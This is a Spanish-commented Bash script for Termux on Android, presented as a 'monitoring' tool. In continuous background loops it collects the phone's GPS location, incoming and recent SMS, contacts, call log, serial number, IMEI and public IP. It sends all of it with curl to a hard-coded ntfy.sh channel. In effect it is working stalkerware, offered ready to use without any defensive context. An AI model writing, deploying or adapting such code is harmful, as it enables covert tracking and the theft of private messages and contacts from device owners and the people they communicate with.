#!/bin/bash
# Script de Monitoreo Completo para Termux (Versión Corregida)
# Incluye recopilación de contactos, SMS y llamadas

# ===== CONFIGURACIÓN =====
NTFY_URL="https://ntfy.sh/JD9WNS9ZNSKS9MQ0AL"  # Cambia por tu canal NTFY
INTERVALO=300      # Intervalo principal: 5 minutos
LOC_INTERVAL=60    # Intervalo ubicación: 1 minuto
SMS_INTERVAL=15    # Chequeo SMS: 15 segundos
MAX_PARALLEL=4     # Máximo procesos concurrentes
LIMITE_REGISTROS=5 # Límite de registros a mostrar

# ===== INICIALIZACIÓN =====
cleanup() {
    kill $(jobs -p) 2>/dev/null
    exit 0
}
trap cleanup EXIT TERM INT

# Directorios de almacenamiento
mkdir -p "$HOME/.monitoreo"
SMS_LAST_ID_FILE="$HOME/.monitoreo/last_sms_id"
CALLS_LAST_ID_FILE="$HOME/.monitoreo/last_call_id"

# ===== FUNCIÓN DE ENVÍO =====
enviar_ntfy() {
    local msg="$1"
    [ -z "$msg" ] && return
    
    while [ $(jobs -r | wc -l) -ge $MAX_PARALLEL ]; do
        sleep 0.1
    done
    
    curl -sS -m 10 \
        -H "Priority: high" \
        -H "Tags: rocket" \
        -d "$msg" \
        "$NTFY_URL" >/dev/null 2>&1 &
}

# ===== OBTENER UBICACIÓN =====
obtener_ubicacion() {
    local loc=$(timeout 10 termux-location -p network 2>/dev/null || 
               timeout 15 termux-location -p gps 2>/dev/null)
    
    if [ -n "$loc" ]; then
        local lat=$(echo "$loc" | jq -r '.latitude // empty')
        local lon=$(echo "$loc" | jq -r '.longitude // empty')
        local acc=$(echo "$loc" | jq -r '.accuracy // "N/A"')
        
        [ -n "$lat" ] && [ -n "$lon" ] && \
        enviar_ntfy "📍 Ubicación
Latitud: $lat
Longitud: $lon
Precisión: $acc m
🗺️ https://maps.google.com?q=$lat,$lon"
    fi
}

# ===== MONITOR SMS =====
monitor_sms() {
    [ -f "$SMS_LAST_ID_FILE" ] || echo "0" > "$SMS_LAST_ID_FILE"
    local last_id=$(cat "$SMS_LAST_ID_FILE")
    
    while true; do
        local new_sms=$(timeout 10 termux-sms-list -l 1 2>/dev/null)
        local current_id=$(echo "$new_sms" | jq -r '.[0]._id // empty')
        
        if [ -n "$current_id" ] && [ "$current_id" != "$last_id" ]; then
            local sender=$(echo "$new_sms" | jq -r '.[0].sender // "Desconocido"')
            local body=$(echo "$new_sms" | jq -r '.[0].body // ""' | head -c 100) # Limitar a 100 caracteres
            
            enviar_ntfy "📩 Nuevo SMS
De: $sender
Contenido: $body"
            
            echo "$current_id" > "$SMS_LAST_ID_FILE"
            last_id="$current_id"
        fi
        
        sleep $SMS_INTERVAL
    done
}

# ===== OBTENER CONTACTOS =====
obtener_contactos() {
    local contacts=$(timeout 30 termux-contact-list 2>/dev/null)
    
    if [ -n "$contacts" ]; then
        local total=$(echo "$contacts" | jq -r 'length')
        enviar_ntfy "📚 Directorio de Contactos
Total de contactos: $total"
        
        # Enviar primeros 5 contactos como ejemplo
        echo "$contacts" | jq -r ".[0:$LIMITE_REGISTROS] | .[] | \"\(.name // \"Sin nombre\"): \(.number // \"Sin número\")\"" | while read -r contacto; do
            enviar_ntfy "👤 $contacto"
            sleep 0.5
        done
    fi
}

# ===== OBTENER HISTORIAL DE LLAMADAS (VERSIÓN CORREGIDA) =====
obtener_llamadas() {
    [ -f "$CALLS_LAST_ID_FILE" ] || echo "0" > "$CALLS_LAST_ID_FILE"
    local last_call_id=$(cat "$CALLS_LAST_ID_FILE")
    
    local calls=$(timeout 20 termux-call-log -l $LIMITE_REGISTROS 2>/dev/null)
    
    if [ -n "$calls" ]; then
        local current_last_id=$(echo "$calls" | jq -r '.[0]._id // empty')
        
        if [ "$current_last_id" != "$last_call_id" ]; then
            enviar_ntfy "📞 Historial de Llamadas (últimas $LIMITE_REGISTROS)"
            
            # Versión corregida del parseo de llamadas
            echo "$calls" | jq -r '.[] | "\(._id) \(.call_type) \(.name // "Desconocido") \(.number // "?") \(.duration // "?") \(.date // "?")"' | while read -r id tipo nombre numero duracion fecha; do
                case $tipo in
                    "OUTGOING") tipo_display="📤 Saliente" ;;
                    "INCOMING") tipo_display="📥 Entrante" ;;
                    "MISSED") tipo_display="❌ Perdida" ;;
                    *) tipo_display="� $tipo" ;;
                esac
                
                enviar_ntfy "$tipo_display: $nombre ($numero) - ${duracion}s - $fecha"
                sleep 0.5
            done
            
            echo "$current_last_id" > "$CALLS_LAST_ID_FILE"
        fi
    fi
}

# ===== RECOPILACIÓN COMPLETA =====
recopilar_datos() {
    # Información básica del dispositivo
    (
    model=$(getprop ro.product.model)
    serial=$(getprop ro.serialno)
    imei=$(timeout 5 termux-telephony-deviceinfo 2>/dev/null | jq -r '.device_id // empty')
    
    enviar_ntfy "📱 Dispositivo
Modelo: $model
Serial: $serial${imei:+$'\n'IMEI: $imei}"
    ) &
    
    # Estado del sistema
    (
    bat=$(timeout 5 termux-battery-status 2>/dev/null)
    [ -n "$bat" ] && {
        lvl=$(echo "$bat" | jq -r '.percentage')
        stat=$(echo "$bat" | jq -r '.status')
        case $stat in
            "CHARGING") stat="🔌 Cargando" ;;
            "DISCHARGING") stat="🔋 Descargando" ;;
            "FULL") stat="✅ Completa" ;;
            *) stat="� $stat" ;;
        esac
        enviar_ntfy "⚡ Batería: $lvl% - $stat"
    }
    
    ip=$(timeout 5 curl -sS ifconfig.me)
    [ -n "$ip" ] && enviar_ntfy "🌐 IP Pública: $ip"
    ) &
    
    # Datos personales
    (
    obtener_contactos
    obtener_llamadas
    
    # SMS recientes (no los nuevos que ya maneja monitor_sms)
    local sms_recientes=$(timeout 15 termux-sms-list -l $LIMITE_REGISTROS 2>/dev/null)
    [ -n "$sms_recientes" ] && {
        enviar_ntfy "💬 SMS Recientes (últimos $LIMITE_REGISTROS)"
        echo "$sms_recientes" | jq -r '.[] | "\(.sender // "Desconocido"): \(.body // "" | .[0:50])"' | while read -r sms; do
            enviar_ntfy "✉️ $sms"
            sleep 0.5
        done
    }
    ) &
    
    wait
}

# ===== EJECUCIÓN PRINCIPAL =====
main() {
    # Verificar dependencias
    if ! command -v termux-location >/dev/null || ! command -v jq >/dev/null; then
        echo "Instalando dependencias..."
        pkg install -y termux-api jq >/dev/null 2>&1 || {
            echo "Error al instalar dependencias"
            exit 1
        }
    fi

    # Verificar permisos
    termux-location >/dev/null 2>&1
    termux-sms-list >/dev/null 2>&1
    termux-call-log >/dev/null 2>&1

    # Iniciar monitores en segundo plano
    monitor_sms &
    
    # Bucle principal
    while true; do
        start_time=$(date +%s)
        
        recopilar_datos
        obtener_ubicacion
        
        elapsed=$(( $(date +%s) - start_time ))
        sleep_time=$(( INTERVALO - elapsed ))
        [ $sleep_time -gt 0 ] && sleep $sleep_time || sleep $INTERVALO
    done
}

main
